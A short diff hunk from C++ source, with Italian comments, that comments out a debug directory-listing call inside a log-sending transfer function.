@@ -2037,7 +2037,7 @@ BOOL Transfer::RestSendLogs() {
 
 #ifdef _DEBUG
 	//ByGio usato per debug
-	DebugListLocalDir();
+	//DebugListLocalDir();
 #endif
 
 	// pSnap puo' essere nullo in caso di errore o se non c'e' uberlogObj.
